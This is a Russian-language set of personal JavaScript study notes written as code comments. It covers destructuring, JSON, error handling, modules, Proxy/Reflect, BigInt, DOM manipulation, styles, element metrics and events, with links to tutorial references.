//? если мы из обьекта вытаскиваем другой обьект, из которого нам также надо вытащить свойство, то обьект будет недоступен, т.к. мы деструктуризируем его значение
/*
let obj = {
    name: 'Dima',
    age: 22,
    secondObj: {
        one: 1,
        two: 2,
    },
};

let { name = 'Alex', age, secondObj: { one, two } } = obj;   //secondObj не будет доступен
console.log(name, age, one, two);
console.log(obj);
*/


//? также можно менять на ходу название переменной
/*
let obj = {age: 22};
let {age: NewAge} = obj;
*/


//? важный момент, заранее если объявить переменные, нужно будет при деструктуризации блок кода обернуть в ()
/*
let obj = {
    name: 'Dima',
    age: 22,
};
let name, age;
({ name, age } = obj);   //без скобок будет ошибка, т.к. компилятор посчитает, что это отдельный блок кода
console.log(name, age);
*/










//!================================================================================================================================================
//? /Date/Дата/
// https://learn.javascript.ru/date
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/Date










//!================================================================================================================================================
//? /JSON/
// https://learn.javascript.ru/json
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/JSON

//? JSON поддерживает следующие типы данных:
//? Объекты { ... }, Массивы [ ... ]
//? Примитивы: строки, числа, логические значения true/false, null
//? undefined при преобразовании в строку будет удален, при выводе из строки - ошибка

//? Важное ограничение: не должно быть циклических ссылок.





//? есть всего 2 метода:
//? stringify - парсит в json формат
//? принимает еще 2 параметра(Массив свойств для кодирования или функция соответствия function(key, value)) и (Дополнительное пространство (отступы), используемое для форматирования.)
/*
let obj = {
    name: 'Dima',
    age: 22,
    secondObj: {
        one: 1,
        two: 2,
    },
};
console.log(JSON.stringify(obj));
*/


//? parse - достает обьект из json
//? функция может принимать 2 параметр, функцию по преобразованию значений
//? функция выдаст ошибку, если json не корректный, поэтому лучше обрабатывать try..catch
/**
let obj = {
    name: 'Dima',
    age: 22,
    secondObj: {
        one: 1,
        two: 2,
    },
};
console.log(JSON.parse(JSON.stringify(obj)));
*/





//? также можно использовать комбинацию методов для глубокого копирования
/*
let obj = {
    name: 'Dima',
    age: 22,
    secondObj: {
        one: 1,
        two: 2,
    },
};
let newObj = JSON.parse(JSON.stringify(obj));
obj.secondObj.one = 'изменил';
console.log(obj);
console.log(newObj);
*/


//? toJSON
//? можно реализовать метод в обьекте, который будет вызывать при преобразовании обьекта в json, это тоже самое что и valueOf и toString
/*
let room = {
    number: 23,
    toJSON() {
        return this.number;
    }
};
console.log(JSON.stringify(room));
*/










//!================================================================================================================================================
//? /Обработка ошибок/Try catch
// https://learn.javascript.ru/try-catch

//? try…catch…finally
//? Try..catch работает синхронно, и если внутри try у нас асинхронный скрипт, то наш трай кэтч не поймает его, т.к. он уже запустит код асинхронный и пойдет дальше


//? Throw Оператор
//? выкидывает ошибку (error, referenceerror и т.д.)


//? Если у нас в блоке try есть return чего-то, то сначала выполнится finally(если в нем есть return, то вернется значение из finally, если нет, то просто отработает скрипт) и вернется значение из блока try
/*
function func() {
    try {return 1;}
    catch (e) {}
    finally {return 2;}
}
let a = func();
console.log(a);
*/


//? мы можем обработать ошибку на всем документе вызвав onerror слушатель на window
/*
globalThis.addEventListener('error', () => {
    console.log('ошибка');
});
throw new Error('bla');
*/










//!================================================================================================================================================
//? /Modules/Модули/
// https://learn.javascript.ru/modules-intro
// https://medium.com/web-standards/es-modules-cartoon-dive-71f42c1e851a
// https://habr.com/ru/post/501198/

//? Модули в js являются самовызвающейся функцией, которая принимает импортируемые файлы и экспортирует сущности
//? При импортировании, модуль отработает только один раз, при повторных импортах заново функциона модуля не будет вызван


//? Отдельный скрипт у которого нет type='module', или нет импортов и экспортов, считается обычным скриптом. Чтобы сделать файл модулем, можно просто прописать export {}



//? CommonJs/EsModules
//? Модули для браузера работают только с import, require не будет работать, это только возможность ноды, но если мы используем бандлеры типа вебпака, то он сам под капотом будет пересобирать наш проект и заменять require на import везде по коду
//? В модули commonjs можно в module.exports присваивать абсолютно любые сущности
//? Также в commonjs можно использовать функцию import динамическую, это возможно делать не только в браузере

//? import/export в es6 только стали поддерживать браузеры


//? Они отличаются следующим:
//? 1) require можно делать в любом месте файла, даже в условиях/import только на верхнем уровне
//? 2) require загружает весь модуль целиком, даже если нужны определенные сущности/выборочная загрузка, весь модуль не тянется
//? 3) require не имеет асинхронности/import можно делать асинхронно, динамический импорт
//? 4) require импортируемые сущности являются константами, напрямую их изменять нельзя. Выдается ошибка





//? Статические импорты
//? ниже импорты и экспорты служат для задания костяка приложения, и они статичны, чтобы всякие сборщики могли потом собрать приложение

//? Чтобы указать файлу скрипта, что это модуль, нужно добавить аттрибут type="module", чтобы были доступны экспорт и импорт


//? модули являются отложенными (deferred)(тоже самое, что и deferred аттрибут для скрипта), то есть выполнение кода будет только после того, как загрузится весь dom


//? в модулях всегда 'use strict'


//? экспортируемая функциональность, даже если она импортируется в несколько модулей будет вызвана один раз, то есть например у нас есть код в файле 1, при импорте его в файлы 2 и 3 он будет выполнен только один раз
/*
📁 alert.js
alert("Модуль выполнен!");
Импорт одного и того же модуля в разных файлах

📁 1.js
import `./alert.js`; // Модуль выполнен!

📁 2.js
import `./alert.js`; // (ничего не покажет)
*/


//? все подключенные скрипты-модули отработают в порядке подключения, сначала полностью отработает первый, второй, и т.д., естественно, ассинхронные функции будут выполнены когда до них дойдет очередь



//? export
//? обычный синтаксис, можно также экспортировать as "", то есть переименовывать при экспорте переменную
/*
export let a = 1;
let b = 2;
export b as b1;

import {a} from '';
*/


//? export default
//? экспортировать можно по дефолту, то есть при импорте не надо ставить фигурные скобки, как в обычном импорте
//? есть подводный камень, что импортированную по дефолту переменную можно обозвать как хочешь, это может принести проблемы
/*
export defaule let a = 1;

import b from '';
*/


//? import
//? существут директива для импорта значений из одного файла в другой, также можно переименовывать переменную, чтобы она была доступна под другим названием
/*
import {a as b} from '';
*/


//? import*
//? импорт всего как "", импортируем все экспортированные значения, как один обьект
/*
import      as object from '';
*/





//?================================================================================================================================================
//? /Динамические импорты/
// https://learn.javascript.ru/modules-dynamic-imports

//? import()
//? позволяет динамически импортировать модуль в файл, по условию и т.д, такой импорт может работать в обычных скриптах без указания аттрибута типа модуль

//? нельзя присваивать извне переменные которые экспортирует модуль, модуль становится readonly, за исключением обьектов, обьекты мутировать можно

//? import.meta.url специальное свойсто - показывает путь текущего модуля абсолютно корня


//? этот метод возврщает промис, в котором резултат - это обьект модуля


//? если динамический модуль внутри себя использует импорт статический, то статический файл подгрузится корректно после загрузки динамического


//? если внутри модуля который мы импортируем будет функция then она вызовется автоматически и это будет результат импорта модуля, тк импорт работает с thenable обьектами
/*
export function then(resolve) {
    console.log("then() called");
    resolve(1);
}
*/




//? /import with/
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import/with
//? все импорты можно настраивать через with и передавать тип загружаемого модуля, и даже загружать css/json
//? каждый импорт - это запрос на файл (вебпак собирает сразу в бандл, но если без сборщика - статические импорты это тоже запросы)
/*
import styles from './css.css' with {type: 'css'};

console.log(styles);
*/









//!================================================================================================================================================
//? /Proxy/Reflect/
// https://learn.javascript.ru/proxy
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/Proxy
// https://tc39.es/ecma262/#sec-proxy-object-internal-methods-and-internal-slots


//? Обьект прокси оборачивается вокруг функции, массива или обьекта и может перехватывать различные действия совершаемые над обьектом(установка значений, получений и т.д.)
//? Прокси – это обёртка вокруг объекта, которая «по умолчанию» перенаправляет операции над ней на объект, но имеет возможность перехватывать их.
//? Проксировать можно любой объект, включая классы и функции.


//? Создается через new Proxy
/*
let a = {};
let proxy = new Proxy(a, handler);
*/
//? Proxy – это особый, «экзотический», объект, у него нет собственных свойств. С пустым handler он просто перенаправляет все операции на target.





//? Прокси оборачивается вокруг цели и вторым аргументом мы описываем перехватчики
/*
let numbers = [0, 1, 2];
numbers = new Proxy(numbers, {
    get(target, prop) {
        if (prop in target) {
            return target[prop];
        } else {
            return 0;
        }
    },
});
console.log(numbers[2]);
*/
//? в данном примере мы поставили перехватчик на гет, и если такого значения нет в массиве, то вернем 0 по дефолту


//? разные хэндленры принимают разные аргументы, они не везде одни и те же


//? Важное правило и пожелание
//? Прокси обьект должен перезаписать тот обьект, к которому был применен, иначе можно легко запутаться кто есть кто. То есть мы перезаписываем в переменную проксировнный обьект.
/*
let a = {};
a = new Proxy(a, {});
*/


//? Прокси !== оригинальный обьект
//? То есть если в set установим обьект, как ключ, а затем проксируем его, то мы не сможем получить обьект из этой коллекции





//?================================================================================================================================================
//? /Reflect/
// https://learn.javascript.ru/proxy#reflect
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/Reflect

//? Следует использовать всегда, когда мы хотим перенаправить действие на изначальный проксированный обьект


//? Для каждого внутреннего метода, перехватываемого Proxy, есть соответствующий метод в Reflect, который имеет такое же имя и те же аргументы, что и у ловушки Proxy.


//? Служит этот класс для сохранения контекста
//? без рефлекта контекст будет теряться, если мы наследуемся от проксированного обьекта
//? например тут ниже без него сработало бы так: при обращении к admin.name он начал бы искать геттер и нашел его в прототипе, в проксированном user, там бы сработал перехватчик, и вызывался бы метод перехвата с this=target, а target это user изначальный, поэтому мы вызывали через reflect этот метод, куда передали третьим параметром receiver "контекст вызова"
/*
let user = {
    _name: 'Dima',
    get name() {
        return this._name;
    }
};
user = new Proxy(user, {
    get(target, prop, receiver) {
        return Reflect.get(target, prop, receiver);
    }
});

let admin = { _name: 'Admin' };
Object.setPrototypeOf(admin, user);

console.log('user', user.name);   //Dima
console.log('admin', admin.name);   //Admin   (без рефлекта вывелось бы Dima)
*/
//? Так что return Reflect... даёт простую и безопасную возможность перенаправить операцию на оригинальный объект и при этом предохраняет нас от возможных ошибок, связанных с этим действием.










//!================================================================================================================================================
//? /Eval is evil/Eval/
// https://learn.javascript.ru/eval

//? Позволяет воспроизвести переданную как строку строку кода

//? В строгом режиме создает свое лексическое окружение, поэтому нельзя снаружи eval достучаться до кода внутри

//? Внутри eval есть доступ к наружным переменным
/*
function f() {
    let a = 2;
    eval('alert(a)');   //2
}
f();
*/










//!================================================================================================================================================
//* ПОТОМ ПРОЧЕСТЬ НА ПОТОМ
//? /Побитовые операторы/
// https://learn.javascript.ru/bitwise-operators










//!================================================================================================================================================
//? /BigInt/
// https://learn.javascript.ru/bigint

//? BigInt нужен для работы с огромными числами, т.к. для обычных памяти не хватает


//? Такие числа всегда должны быть целыми и не возвращют дробные результаты, т.е. операции с ними возвращают всегда целое число


//? Также их нельзя смешивать с обычными при работе


//? Чтобы преобразовать после работы bigint в обычное число используется Number() функция
//? Конвертирование bigint в число всегда происходит неявно и без генерации ошибок, но если значение bigint слишком велико и не подходит под тип number, то дополнительные биты будут отброшены, так что следует быть осторожными с такими преобразованиями.
//? Унарный оператор + является хорошо известным способом конвертировать произвольное значение value в число. Данный оператор не поддерживается при работе с BigInt числами.


//? Операторы сравнения и логические операции ведут себя также, как с обычым числом, т.е. 0n это false и т.д.


//? Сравнение с числом при строгом будет выдывать ошибку, т.к. это другой тип данных, при обычном же все будет хорошо сравниваться, но если число больше, чем 2**53-1, то могут возникать ошибки при сравнении










//!================================================================================================================================================
//* ПОТОМ ПРОЧЕСТЬ НА ПОТОМ
//? /Intl/Интернационализация/
// https://learn.javascript.ru/intl
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/Intl
// http://www.iana.org/assignments/language-subtag-registry/language-subtag-registry
// https://index.minfin.com.ua/reference/currency/code/        ***коды валют
/*
**
***
****
*****/
//?=============================================================================
//? /Intl.Collator/
//? используется для сравнения строк на разных локалях, внутри строки localeCompare под капотом как раз этот класс










//!================================================================================================================================================
//? /Window/Глобальный обьект/
// https://learn.javascript.ru/global-object
// https://developer.mozilla.org/ru/docs/Web/API/Window

//? Window - это глобальный обьект браузера, то есть этот обьект доступен везде в коде, во всех модулях и т.д. потому что он глобальный


//? Каждая среда исполнения имеет собственный глобальный обьект(например в Node.js - global)
//? Поэтому, если код возможно будет где то запускаться помимо браузера, то ввели стандартизированное обращение к глобальному обьекту через globalThis, который поддерживается практически везде, так что можно пользоваться им спокойно

/*
**
***
****
*****/
//?================================================================================================================================================
//? /Навигация по DOM и взаимодействие с элементами/
// https://learn.javascript.ru/dom-navigation
// https://developer.mozilla.org/ru/docs/Web/API/Element


//? Навигация по DOM:
//? Для всех узлов: parentNode, childNodes, firstChild, lastChild, previousSibling, nextSibling
//? Только для узлов-элементов: parentElement, children, firstElementChild, lastElementChild, previousElementSibling, nextElementSibling





//?================================================================================================================================================
//? /Поиск элементов/
// https://learn.javascript.ru/searching-elements-dom


//? Методы поиска:
//? document.getElementById
//? ищет элемент по указанному id, есть еще дополнительное поведение, которое не желательно использовать, это то, что в коде мы можем просто написать обращение к id элемента и мы получим его, сделано это для поддержки старого кода
//? применяется только на документ
/*
<div id="test"></div>
в коде***
console.log(test);   //сработает такое, и надо избегать подобного
*/

//? elem.querySelector/elem.querySelectorAll
//? querySelector - возвращает первый найденный элемент
//? querySelectorAll - принимает css селектор и возвращает по указанному селектору все элементы найденные, может применяться не только на document но и на элемент, также может принимать в себя псевдокласс, например :hover. Также этот метод возвращает статическую коллекцию

//? elem.matches
//? метод не ищет, а просто принимает в себя селектор и возвращает булеан значение по соответствию
/*
elem.matches('a[href$="zip"];
*/

//? elem.closest
//? принимает селектор и ищет в цепочке родителей/предков соответствие на данный селектор, начиная с самого себя
/*
<div>  <span></span>  <span></span>  </div>
let spans = document.querySelector('#test').children;
console.log(spans[0].closest('#test'));   //вернет div

let spans = document.querySelector('#test').children;
console.log(spans[0].closest('span'));   //вернет сам себя, потому что поиск начинается с себя
*/

//? elem.getElementsByTagName
//? ищет элементы с данным тегом и возвращает их коллекцию. Передав "*" вместо тега, можно получить всех потомков.

//? elem.getElementsByClassName
//? возвращает элементы, которые имеют данный CSS-класс.

//? document.getElementsByName
//? возвращает элементы с заданным атрибутом name. Очень редко используется.





//? Статические коллекции и динамические
//? Статическими коллекциями являются те, которые были созданы через querySelectorAll, в них всегда будут изначальные элементы, во всех остальных getElementsBy* будут динамическими, а также обращения через children тоже будут возвращать динамические коллекции
/*
let spansParent = document.querySelectorAll('#test');
console.log(spansParent);
spansParent[0].remove();
console.log(spansParent);

let spansParent2 = document.getElementsByTagName('div');
console.log(spansParent2);
spansParent2[0].remove();
console.log(spansParent2);
*/





//?================================================================================================================================================
//? /Свойства узлов/
// https://learn.javascript.ru/basic-dom-node-properties


//? Каждый узел дома создается через наследование от других классов
//? Существуют следующие классы:
//? EventTarget – это корневой «абстрактный» класс. Объекты этого класса никогда не создаются. Он служит основой, благодаря которой все DOM-узлы поддерживают так называемые «события», о которых мы поговорим позже.

//? Node – также является «абстрактным» классом, и служит основой для DOM-узлов. Он обеспечивает базовую функциональность: parentNode, nextSibling, childNodes и т.д. (это геттеры). Объекты класса Node никогда не создаются. Но есть определённые классы узлов, которые наследуют от него: Text – для текстовых узлов, Element – для узлов-элементов и более экзотический Comment – для узлов-комментариев.

//? Element – это базовый класс для DOM-элементов. Он обеспечивает навигацию на уровне элементов: nextElementSibling, children и методы поиска: getElementsByTagName, querySelector. Браузер поддерживает не только HTML, но также XML и SVG. Класс Element служит базой для следующих классов: SVGElement, XMLElement и HTMLElement.

//? HTMLElement – является базовым классом для всех остальных HTML-элементов. От него наследуют конкретные элементы:

//? HTMLInputElement – класс для тега <input>,
//? HTMLBodyElement – класс для тега <body>,
//? HTMLAnchorElement – класс для тега <a>,  …и т.д, каждому тегу соответствует свой класс, который предоставляет определённые свойства и методы.
//? Таким образом, полный набор свойств и методов данного узла собирается в результате наследования.


//? nodeType
//? Свойство nodeType предоставляет ещё один, «старомодный» способ узнать «тип» DOM-узла.
//? Его значением является цифра:
//? elem.nodeType == 1 для узлов-элементов, elem.nodeType == 3 для текстовых узлов, elem.nodeType == 9 для объектов документа, и т.д.


//? nodeName и tagName
//? выводят имя тега, разница в том, что tagName вернет что то только для тегов, которые являются элементами, nodeName есть у любых типов узлов


//? innerHTML
//? Вставить HTML код и прочесть его. Свойство innerHTML есть только у узлов-элементов.
//? при установке нового кода, старый будет перезаписан, а значит, если мы хотим просто добавить, надо сконкатенировать значения
//? так как содержимое «обнуляется» и переписывается заново, все изображения и другие ресурсы будут перезагружены.
/*
element.innerHTML = '<p>HELLO WORLD</p>';
*/


//? outerHTML
// https://learn.javascript.ru/basic-dom-node-properties#outerhtml-html-elementa-tselikom
//? свойство outerHTML содержит HTML элемента целиком. Это как innerHTML плюс сам элемент.
//? Будьте осторожны: в отличие от innerHTML, запись в outerHTML не изменяет элемент. Вместо этого элемент заменяется целиком во внешнем контексте. То есть если мы получили элемент, затем модифицировали его, то в ссылке на элемент будет все также находится старый код, поэтому надо снова получить элемент
/*
<div>Привет, мир!</div>

<script>
  let div = document.querySelector('div');
  div.outerHTML = '<p>Новый элемент</p>';   //заменяем div.outerHTML на <p>..
  alert(div.outerHTML); // <div>Привет, мир!</div>   // Содержимое div осталось тем же!
</script>
*/
//? То есть, при div.outerHTML=... произошло следующее: div был удалён из документа. Вместо него был вставлен другой HTML <p>Новый элемент</p>. В div осталось старое значение. Новый HTML не сохранён ни в какой переменной. Здесь легко сделать ошибку: заменить div.outerHTML, а потом продолжить работать с div, как будто там новое содержимое. Но это не так. Подобное верно для innerHTML, но не для outerHTML.
//? Мы можем писать в elem.outerHTML, но надо иметь в виду, что это не меняет элемент, в который мы пишем. Вместо этого создаётся новый HTML на его месте. Мы можем получить ссылки на новые элементы, обратившись к DOM.


//? textContent
//? Вставить текст в элемент и прочесть его
/*
element.textContent = 'HELLO WORLD';
*/


//? nodeValue/data
// https://learn.javascript.ru/basic-dom-node-properties#nodevalue-data-soderzhimoe-tekstovogo-uzla
//? Свойство innerHTML есть только у узлов-элементов. У других типов узлов, в частности, у текстовых, есть свои аналоги: свойства nodeValue и data


//? hidden
//? аттрибут, который скрывает элемент(по сути тоже самое, что и display: none)





//?================================================================================================================================================
//? /Аттрибуты и свойства/
// https://learn.javascript.ru/dom-attributes-and-properties


//? Когда создается дом, браузер парсит все аттрибуты и если они стандартные, то записывает их в обьект этого тега, например type будет доступен как свойство type в обьекте этого тега, все же остальные аттрибуты можно получить только с помощью методов
/*
<input type="phone"/>
*/


//? Все аттрибуты регистронезависимы, то есть 'id'==='ID', а также их значения всегда строки


//? Методы:
//? elem.hasAttribute(name)
//? проверяет наличие атрибута

//? elem.getAttribute(name)
//? получает значение  атрибута

//? elem.setAttribute(name, value)
//? устанавливает значение атрибута

//? elem.removeAttribute(name)
//? удаляет атрибут

//? elem.attributes
//? получить все аттрибуты елемента


//? Dataset
//? Можно использовать как обычные аттрибуты, так и аттрибуты с припиской data-, есть плюс в использовании второго варианта, что первые(могут когда нибудь ввестись в язык и быть нативными, что конечно маловероятно), поэтому аттрибуты можно также записывать кастомные с приставкой data-, и они будут также доступны с помощью методов, а также их можно получить через dataset свойство элемента, где в этом обьекте имена аттрибутов будут в camelCase
/*
let test = document.querySelector('#test');
test.setAttribute('custom-attribute-prop', true);
test.setAttribute('data-custom-attribute-prop', true);

console.dir(test.attributes['custom-attribute-prop'].value);
console.dir(test.getAttribute('data-custom-attribute-prop'));
console.dir(test.dataset.customAttributeProp);
*/





//?================================================================================================================================================
//? /Изменение документа/
// https://learn.javascript.ru/modifying-document


//? createElement
//? создает элемент, который затем надо поместить на страницу
//? тут прикол, что браузер не анализирует этот элемент https://web.dev/articles/client-side-rendering-of-html-and-interactivity?hl=ru

//? createTextNode
//? создаёт текстовый узел (редко используется)

//? element.append()
//? Добавляет элемент в конец родителя

//? element.prepend()
//? Добавляет элемент вначло родителя

//? element.before(div)
//? Перед каким то элементом

//? element.after(div)
//? После какого то элемента

//? element.remove()
//? Удалить элемент из документа

//? element.replaceWith(div)
//? Какой элемент мы хотим заменить элементом в скобках

//? element.insertAdjacentHTML/Text/Element
//? Вставить HTML код перед, после и т.д.
//? "beforebegin" – вставить html непосредственно перед elem, "afterbegin" – вставить html в начало elem, "beforeend" – вставить html в конец elem, "afterend" – вставить html непосредственно после elem
/*
element.insertAdjacentHTML('afterend', '<h1>HELLO WORLD</h1>');
*/

//? element.cloneNode()
//? клонирует указанный элемент, принимает булеан параметр, если true - то глубоко копирует, вместе с детьми, если false - то только элемент с аттрибутами и классами


//? При перемещении узла, когда мы получили его и хотим поместить его в другое место на странице, он удалится автоматически со старого места, так что нет необходимости удалять его


//? DocumentFragment
// https://learn.javascript.ru/modifying-document#document-fragment
//? Специальный дом узел который служит оберткой для передачи списка узлов, который затем удаляется со страницы, то есть не парсится
/*
<ul id="ul"></ul>

<script>
function getListContent() {
    let fragment = new DocumentFragment();
    for(let i=1; i<=3; i++) {
        let li = document.createElement('li');
        li.append(i);
        fragment.append(li);
    }
    return fragment;
}
ul.append(getListContent());   //не отобразится в доме
</script>
*/


//? document.write
// https://learn.javascript.ru/modifying-document#neskolko-slov-o-document-write
//? Древний метод добавления содержимого на страницу, вызов функции этой генерирует здесь и сейчас строку
//? Вызов document.write работает только во время загрузки страницы. Если вызвать его позже, то существующее содержимое документа затрётся. Так что после того, как страница загружена, он уже непригоден к использованию, в отличие от других методов DOM, которые мы рассмотрели выше. Это его недостаток. Есть и преимущество. Технически, когда document.write запускается во время чтения HTML браузером, и что-то пишет в документ, то браузер воспринимает это так, как будто это изначально было частью загруженного HTML-документа. Поэтому он работает невероятно быстро, ведь при этом нет модификации DOM. Метод пишет прямо в текст страницы, пока DOM ещё в процессе создания. Так что, если нам нужно динамически добавить много текста в HTML, и мы находимся на стадии загрузки, и для нас очень важна скорость, это может помочь. Но на практике эти требования редко сочетаются. И обычно мы можем увидеть этот метод в скриптах просто потому, что они старые.





//?================================================================================================================================================
//? /Styles/Classes/Стили/Классы/CSS/
// https://learn.javascript.ru/styles-and-classes


//? className
//? предоставляет классы элемента в виде строки
//? если мы присваиваем значение className, то мы заменяем уже все существующие классы, иногда полезно иногда нет


//? classList
//? предоставляет классы элемента в виде массива, а также методы для манипуляций с классами





//? Стили заданные через скрипт, то есть инлайном перебивают абсолютно все стили, то есть у них высший приоритет


//? style
//? стили задаются через присваивание значений этому обьекту, записываются названия стилей в camelCase
//? этот обьект только для задания значений, ничего прочитать мы не сможем
/*
document.body.style.backgroundColor = 'green';
*/
//? Стили с браузерным префиксом, например, -moz-border-radius, -webkit-border-radius преобразуются по тому же принципу: дефис означает заглавную букву
/*
button.style.MozBorderRadius = '5px';
button.style.WebkitBorderRadius = '5px';
*/

//? сброс стилей
//? просто присваиваем пустую строку, это значит, что мы устанавливаем значение по умолчанию


//? cssText
//? позволяет в строке записать сразу несколько стилей для элемента, но это свойство не добавляет, а ЗАМЕНЯЕТ все существующие стили
//? То же самое можно сделать установкой атрибута: div.setAttribute('style', 'color: red...')
/*
div.style.cssText = `
    color: red;
    background-color: yellow;
    width: 100px;
    text-align: center;
`;
*/


//? getComputedStyle
// https://developer.mozilla.org/ru/docs/Web/API/Window/getComputedStyle
//? возвращает объект, содержащий значения всех CSS-свойств элемента, полученных после применения всех активных таблиц стилей, и завершения базовых вычислений значений, которые они могут содержать

//? метод принимает сам элемент, и может принять псевдоэлемент, чтобы узнать его стили

//? лучше всего использовать в этом обьекте конкретный свойства(например не margin, marginLeft), потому что есть некие несоответствия в браузерах и дефолтное поведение отличается

//? Стили, применяемые к посещённым :visited ссылкам, скрываются! Посещённые ссылки могут быть окрашены с помощью псевдокласса :visited. Но getComputedStyle не даёт доступ к этой информации, чтобы произвольная страница не могла определить, посещал ли пользователь ту или иную ссылку, проверив стили. JavaScript не видит стили, применяемые с помощью :visited. Кроме того, в CSS есть ограничение, которое запрещает в целях безопасности применять к :visited CSS-стили, изменяющие геометрию элемента. Это гарантирует, что нет обходного пути для «злой» страницы проверить, была ли ссылка посещена и, следовательно, нарушить конфиденциальность.
/*
**
***
****
*****/
//?=============================================================================
//? /CssVariables/customproperties/custom-properties/
//? setProperty - вызывается на элементе и устанавливает свойство css для этого элемента, также можно установить "important"
//? getPropertyPriority - important ли стиль или нет

//? CSS.registerProperty/at-property - регистрирует на самом верхнем уровне свойство, можно сделать так, чтобы его можно было переопределить ниже по дереву, а можно и запретить это делать
/*
**
***
****
*****/
//?=============================================================================
//? /Css.supports/
//? поддерживает браузер такое то свойство
/*
**
***
****
*****/
//!=============================================================================
//? /Metrics/Размеры и прокрутка страницы/
// https://learn.javascript.ru/size-and-scroll


//? Важная деталь с padding!!!
//? если у нас много текста, то на него padding-bottom не работает, то есть текст может находиться там, где у нас есть падинг снизу, если текста много


//? offsetParent
// https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/offsetParent
//? в свойстве offsetParent находится предок элемента, который используется внутри браузера для вычисления координат при рендеринге. то есть, ближайший предок, который удовлетворяет следующим условиям: является CSS-позиционированным (CSS-свойство position равно absolute, relative, fixed или sticky), или <td>, <th>, <table>, или <body>, то есть для обычных тегов в основном будет ссылка на body
//? Существует несколько ситуаций, когда offsetParent равно null:
//? для скрытых элементов (с CSS-свойством display:none или когда его нет в документе).
//? для элементов <body> и <html>.
//? для элементов с position:fixed.


//? свойства offsetLeft/offsetTop содержат координаты x/y относительно верхнего левого угла offsetParent


//? offsetWidth/offsetHeight
//? эти два свойства – самые простые. Они содержат «внешнюю» ширину/высоту элемента, то есть его полный размер, включая рамки и падинг


//? clientLeft/clientTop
//? это отступы от внешней части элемента до внутренней, если считать по простому, то это ширина рамок, но не все так просо, если же у нас полоса прокрутки будет слева, то и она будет засчитана в это значение(clientLeft). Как раз и получится, что отступ внутренней части от внешней


//? clientWidth/Height
//? это ширина и высота внутренней части элемента, включая падинг, но не включая рамку, и полосу прокрутки
//? это не точно???если паддингов нет и есть полоса прокрутки, то вернет значение вместе с полосой прокрутки


//? scrollWidth/Height
//? эти свойства – как clientWidth/clientHeight, но также включают в себя прокрученную (которую не видно) часть элемента.


//? scrollLeft/scrollTop
//? свойства, которые показывают прокрученные значения сверху и слева(которые не видно)
//? эти свойства изменяемы, и ими можно изменять прокрутку элемента





//? не использовать width/heigth из getComputedStyle
// https://learn.javascript.ru/size-and-scroll#ne-stoit-brat-width-height-iz-css
//? потому что эти значения зависят от значения 'box-sizing', а также они могут быть равны 'auto'


//? Примеры
/*
let test = document.querySelector('#test');

console.log('clientHeight', test.clientHeight);
console.log('clientWidth', test.clientWidth);
console.log('clientLeft', test.clientLeft);
console.log('clientTop', test.clientTop);
console.log('offsetParent', test.offsetParent);
console.log('offsetTop', test.offsetTop);
console.log('offsetLeft', test.offsetLeft);
console.log('offsetWidth', test.offsetWidth);
console.log('offsetHeight', test.offsetHeight);
console.log('scrollHeight', test.scrollHeight);
console.log('scrollTop', test.scrollTop);
console.log('contentWidth', test.clientWidth - parseFloat(getComputedStyle(test).paddingLeft) - parseFloat(getComputedStyle(test).paddingRight));   //ширина контента без всего
*/






//?================================================================================================================================================
//? /Размеры и прокрутка окна/
// https://learn.javascript.ru/size-and-scroll-window

//? documentElement.clientHeight
//? высота текущего окна без полосы прокрутки


//? documentElement.clientWidth
//? ширина текущего окна без полосы прокрутки


//? window.innerWidth/Height
//? отличаются от вышеперечисленных свойств тем, что включают в себя полосу прокрутки


//? documentElement.scrollHeight/scrollWidth
//? полная высота документа. а этом элементе, для страницы в целом, эти свойства работают не так, как предполагается. В Chrome/Safari/Opera, если нет прокрутки, то documentElement.scrollHeight может быть даже меньше, чем documentElement.clientHeight! С точки зрения элемента это невозможная ситуация. Чтобы надёжно получить полную высоту документа, нам следует взять максимальное из этих свойств:
/*
let scrollHeight = Math.max(
    document.body.scrollHeight, document.documentElement.scrollHeight,
    document.body.offsetHeight, document.documentElement.offsetHeight,
    document.body.clientHeight, document.documentElement.clientHeight
);
*/


//? documentElement.scrollLeft/scrollTop
//? получение текущей прокрутки. Существует баг, что в safari надо использовать document.body


//? window.pageYOffset/pageXOffset
//? получение текущей прокрутки


//? scrollTo, scrollBy, scrollIntoView
//? Прокрутка документа и элементов. Обычно можно прокручивать элементы меняя им scrollTop/scrollLeft, но также можно использовать эти методы
//? прокрутка не работает, пока дом не загружен полностью


//? Запретить скролл можно с помощью overflow='hidden'


//? Примеры
/*
console.log('clientHeight', document.documentElement.clientHeight);
console.log('clientWidth', document.documentElement.clientWidth);
console.log('innerHeight', window.innerHeight);
console.log('innerWidth', window.innerWidth);
console.log('scrollHeight', document.documentElement.scrollHeight);
console.log('scrollWidth', document.documentElement.scrollWidth);
console.log('scrollTop', document.documentElement.scrollTop);
console.log('scrollLeft', document.documentElement.scrollLeft);
console.log('pageYOffset', window.pageYOffset);
console.log('pageXOffset', window.pageXOffset);
*/





//?================================================================================================================================================
//? /Координаты/
// https://learn.javascript.ru/coordinates


//? element.getBoundingClientRect
//? метод возвращает координаты элемента относительно окна(экрана), то есть расчет всегда относительно верхнего левого угла экрана идет:
//? bottom - нижняя граница элемента относительно верха окна(может быть отрицательным, когда элемент выходит за границы)
//? top - левый верхний угол элемента относительно верха окна
//? left - левый верхний угол элемента относительно левой части окна
//? right - правая граница элемента относительно левой части окна
//? height - высота
//? width - ширина

//? top/left не всегда равный x/y, если например, задать x/y координаты 200/200, и ширину с высотой -200/-200, то top/left значения будут равны нулям


//? elementFromPoint(x, y)
//? возвращает самый глубоко вложенный элемент в окне по данным координатам
//? Для координат за пределами окна метод elementFromPoint возвращает null Метод document.elementFromPoint(x,y) работает, только если координаты (x,y) относятся к видимой части содержимого окна. Если любая из координат представляет собой отрицательное число или превышает размеры окна, то возвращается null.










//!================================================================================================================================================
//? /События/Events/
// https://learn.javascript.ru/introduction-browser-events
// https://developer.mozilla.org/ru/docs/Web/Events        ***все события



//? EventTarget
//? Класс, который позволяет создавать подписку и отправлять события. По сути это самый базовый класс, от которого наследуются ноды, к которым можно применить обработку событий



//? in html
//? можно подписаться в самом html файле


